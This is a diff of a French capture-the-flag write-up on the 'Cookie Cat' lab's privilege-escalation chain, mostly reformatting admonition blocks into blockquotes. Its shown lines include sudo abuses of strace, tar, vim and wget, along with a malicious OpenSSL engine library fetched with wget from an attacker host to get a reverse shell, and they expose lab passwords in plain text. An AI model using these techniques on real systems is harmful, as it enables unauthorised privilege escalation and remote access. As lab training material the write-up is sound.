@@ -1,3 +1,5 @@
+# Chaîne d'escalade de privilèges - Challenge Cookie Cat
+
 **Informations de connexion initiale :**
 - IP : `10.40.40.101`
 - Port SSH : `2222`
@@ -50,9 +52,9 @@ Error: "O8oVjKYzO5dlU7wS5gt2qwlyBRs3LsHF8ZhRJnO17hrovLZd4EfQmtia1bOq9wYR" does n
 
 Le message d'erreur révèle le mot de passe ! 
 
-:::admonition[success][✅ Password cookie_cat_2]
-`O8oVjKYzO5dlU7wS5gt2qwlyBRs3LsHF8ZhRJnO17hrovLZd4EfQmtia1bOq9wYR`
-:::
+> **✅ Password cookie_cat_2**
+> 
+> `O8oVjKYzO5dlU7wS5gt2qwlyBRs3LsHF8ZhRJnO17hrovLZd4EfQmtia1bOq9wYR`
 
 ```bash
 su cookie_cat_2
@@ -76,9 +78,9 @@ User cookie_cat_2 may run the following commands:
 
 ### Exploitation avec strace
 
-{{< admonition info "Info" >}}
-`strace` permet de tracer les appels système. On peut l'utiliser pour lire des fichiers en traçant un programme qui lit le fichier cible.
-{{< /admonition >}}
+> **ℹ️ Info**
+> 
+> `strace` permet de tracer les appels système. On peut l'utiliser pour lire des fichiers en traçant un programme qui lit le fichier cible.
 
 ```bash
 sudo -u cookie_cat_3 strace -s 4096 /bin/cat /home/cookie_cat_3/password 2>&1 | grep -A 10 read
@@ -89,9 +91,9 @@ sudo -u cookie_cat_3 strace -s 4096 /bin/cat /home/cookie_cat_3/password 2>&1 | 
 read(3, "cookie_cat_3:PAymH4vUhi2RFcgr8AZiolFChGR3odo6C4UOKfI67nV7fI1pfe9Kjrt87Nl2GyN6\n", 131072) = 78
 ```
 
-:::admonition[success][✅ Password cookie_cat_3]
-`PAymH4vUhi2RFcgr8AZiolFChGR3odo6C4UOKfI67nV7fI1pfe9Kjrt87Nl2GyN6`
-:::
+> **✅ Password cookie_cat_3**
+> 
+> `PAymH4vUhi2RFcgr8AZiolFChGR3odo6C4UOKfI67nV7fI1pfe9Kjrt87Nl2GyN6`
 
 ```bash
 su cookie_cat_3
@@ -121,9 +123,9 @@ D'après [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), `tar` peut exécu
 sudo -u cookie_cat_4 tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
 ```
 
-:::admonition[success][✅ Shell cookie_cat_4]
-Shell obtenu en tant que cookie_cat_4
-:::
+> **✅ Shell cookie_cat_4**
+> 
+> Shell obtenu en tant que cookie_cat_4
 
 ---
 
@@ -154,9 +156,9 @@ Dans vim, taper :
 :!/bin/bash
 ```
 
-:::admonition[success][✅ Shell cookie_cat_5]
-Shell obtenu en tant que cookie_cat_5
-:::
+> **✅ Shell cookie_cat_5**
+> 
+> Shell obtenu en tant que cookie_cat_5
 
 ---
 
@@ -186,9 +188,9 @@ chmod +x $TF
 sudo -u cookie_cat_6 wget --use-askpass=$TF 0
 ```
 
-:::admonition[success][✅ Shell cookie_cat_6]
-Shell obtenu en tant que cookie_cat_6
-:::
+> **✅ Shell cookie_cat_6**
+> 
+> Shell obtenu en tant que cookie_cat_6
 
 ---
 
@@ -212,7 +214,7 @@ OpenSSL permet de charger des bibliothèques dynamiques personnalisées via l'op
 
 #### Création de l'exploit
 
-**Sur notre machine :**
+**Sur la machine attaquante (Exegol) :**
 
 ```c
 cat > shell.c << 'EOF'
@@ -257,13 +259,13 @@ wget http://10.40.40.53:8000/shell.so -O /dev/shm/shell.so
 sudo -u cookie_cat_7 /usr/bin/openssl req -engine /dev/shm/shell.so
 ```
 
-:::admonition[tip][💡 Note importante]
-Le fichier doit être placé dans `/dev/shm` car `/tmp` est monté avec l'option `noexec` qui empêche l'exécution de bibliothèques partagées.
-:::
+> **💡 Note importante**
+> 
+> Le fichier doit être placé dans `/dev/shm` car `/tmp` est monté avec l'option `noexec` qui empêche l'exécution de bibliothèques partagées.
 
-:::admonition[success][✅ Reverse Shell cookie_cat_7]
-Reverse shell obtenu en tant que cookie_cat_7
-:::
+> **✅ Reverse Shell cookie_cat_7**
+> 
+> Reverse shell obtenu en tant que cookie_cat_7
 
 ---
 
